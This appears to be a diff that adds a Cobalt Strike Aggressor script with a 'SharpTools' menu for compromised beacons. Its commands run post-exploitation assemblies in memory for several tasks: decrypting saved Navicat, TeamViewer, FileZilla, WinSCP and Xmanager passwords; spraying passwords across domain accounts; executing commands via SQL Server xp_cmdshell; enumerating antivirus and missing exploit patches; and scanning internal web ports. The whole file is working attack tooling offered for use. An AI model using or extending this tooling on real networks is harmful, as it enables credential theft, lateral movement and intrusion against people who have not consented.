@@ -1,0 +1,105 @@
+sub SharpEventLog {
+	bexecute_assembly($bid, script_resource("SharpEventLog.exe"), $3['EventLogType']);
+}
+
+sub SharpAVKB {
+	bexecute_assembly($bid, script_resource("SharpAVKB.exe"), $3['Type']);
+}
+
+sub SharpDecryptPwd {
+	if($3['type'] =~ "-Xmangager"){
+		$arg = join(' ', @($3['type'],"-p",$3['path']));
+		bexecute_assembly($bid, script_resource("SharpDecryptPwd.exe"), $arg);
+	}
+	else
+	{
+		bexecute_assembly($bid, script_resource("SharpDecryptPwd.exe"), $3['type']);
+	}
+}
+
+sub SharpWebScan {
+	$arg = join(' ', @($3['iptype'],$3['ip'],$3['port']));
+	bexecute_assembly($bid, script_resource("SharpWebScan.exe"), $arg);
+}
+
+sub SharpDomainSpray {
+	$arg = join(' ', @($3['type'],$3['context']));
+	bexecute_assembly($bid, script_resource("SharpDomainSpray.exe"), $arg);
+}
+
+sub SharpSQLTools {
+	if($3['enable'] =~ "enable"){
+		$arg = join(' ', @("-h",$3['host'],"-u",$3['username'],"-p",$3['password'],$3['type'],$3['enable']));
+		bexecute_assembly($bid, script_resource("SharpSQLTools.exe"), $arg);
+		}
+	else
+	{
+		$arg = join(' ', @("-h",$3['host'],"-u",$3['username'],"-p",$3['password'],$3['type'],"-c","$3['cmd']"));
+		bexecute_assembly($bid, script_resource("SharpSQLTools.exe"), $arg);
+		}
+}
+
+popup beacon_bottom {
+    menu "SharpTools" {
+        item "SharpEventLog" {
+			$bid = $1;
+			$dialog = dialog("SharpEventLog", %(EventLogType => "-4624",bid => $bid), &SharpEventLog);
+			dialog_description($dialog, "Get Windows Login EventLog:Login success:4624 And Login Failure:4625");
+			drow_combobox($dialog, "EventLogType", "EventLog Type:", @("-4624", "-4625"));
+            dbutton_action($dialog, "Neo Go ~~");
+			dialog_show($dialog);
+        }
+		item "SharpWebScan" {
+			$bid = $1['@'];
+			$dialog = dialog("SharpWebScan", %(iptype => "-IP",ip => beacon_info($bid,"internal"),port => "80,8080,8001,1433",bid => $bid), &SharpWebScan);
+			dialog_description($dialog, "A Multi Port Web Title Scanner");
+			drow_text($dialog, "ip", "ip:  ");	
+			drow_text($dialog, "port", "ports:  ");			
+			drow_combobox($dialog, "iptype", "-ip/-cip", @("-IP", "-CIP"));
+            dbutton_action($dialog, "Neo Go ~~");
+			dialog_show($dialog);
+        }
+		item "SharpAVKB" {
+			$bid = $1;
+			$dialog = dialog("SharpAVKB", %(Type => "-AV",bid => $bid), &SharpAVKB);
+			dialog_description($dialog, "GetWindowsAnti-VirusSoftware And GetWindowsKernelExploitsKB");
+			drow_combobox($dialog, "Type", "Type:", @("-AV", "-KB"));
+            dbutton_action($dialog, "Neo Go ~~");
+			dialog_show($dialog);
+        }
+		item "SharpSQLTools" {
+			$bid = $1['@'];
+			$dialog = dialog("SharpSQLTools", %(host => "",username => "",password => "",type => "xp",cmd => "whoami",enable => "None",bid => $bid), &SharpSQLTools);
+			dialog_description($dialog, "Command Line SQLTools");
+			drow_text($dialog, "host", "host:  ");	
+			drow_text($dialog, "username", "username:  ");	
+			drow_text($dialog, "password", "password:  ");			
+			drow_combobox($dialog, "type", "-xp/-sp", @("-xp", "-sp"));
+			drow_combobox($dialog, "enable", "enable", @("None", "enable"));
+			drow_text($dialog, "cmd", "cmd:  ");
+            dbutton_action($dialog, "Neo Go ~~");
+			dialog_show($dialog);
+        }
+		item "SharpDecryptPwd" {
+			$bid = $1['@'];
+			$dialog = dialog("SharpDecryptPwd", %(type => "-NavicatCrypto",path => "D:\\xshell\\Xshell\\Sessions",bid => $bid), &SharpDecryptPwd);
+			dialog_description($dialog, "DecryptPwd:Navicat,TeamViewer,FileZilla,WinSCP,Xmangager");
+			drow_combobox($dialog, "type", "Type:", @("-NavicatCrypto", "-TeamViewer", "-FileZilla", "-WinSCP", "-Xmangager"));
+			drow_text($dialog, "path", "Sessions Path:  ");
+            dbutton_action($dialog, "Neo Go ~~");
+			dialog_show($dialog);
+        }
+		item "SharpDomainSpray" {
+			$bid = $1['@'];
+			$dialog = dialog("SharpDomainSpray", %(type => "-Pass2User",context => "",bid => $bid), &SharpDomainSpray);
+			dialog_description($dialog, "SharpDomainSpray is a very simple password spraying tool written in .NET. It takes a password then finds users in the domain and attempts to authenticate to the domain with that given password.");
+			drow_combobox($dialog, "type", "Type:", @("-Pass2User", "-User2Pass"));
+			drow_text($dialog, "context", "User/Pass:  ");
+            dbutton_action($dialog, "Neo Go ~~");
+			dialog_show($dialog);
+        }
+		
+    }
+}
+
+
